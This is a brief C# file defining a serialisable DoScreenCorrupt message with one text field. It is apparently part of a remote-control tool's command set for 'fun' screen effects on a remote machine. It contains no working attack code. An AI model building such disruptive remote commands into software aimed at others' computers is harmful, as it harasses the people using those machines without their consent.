using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;

namespace Pulsar.Common.Messages.FunStuff.GDI
{
    [MessagePackObject]
    public class DoScreenCorrupt : IMessage
    {
        [Key(1)]
        public string Message { get; set; }
    }
}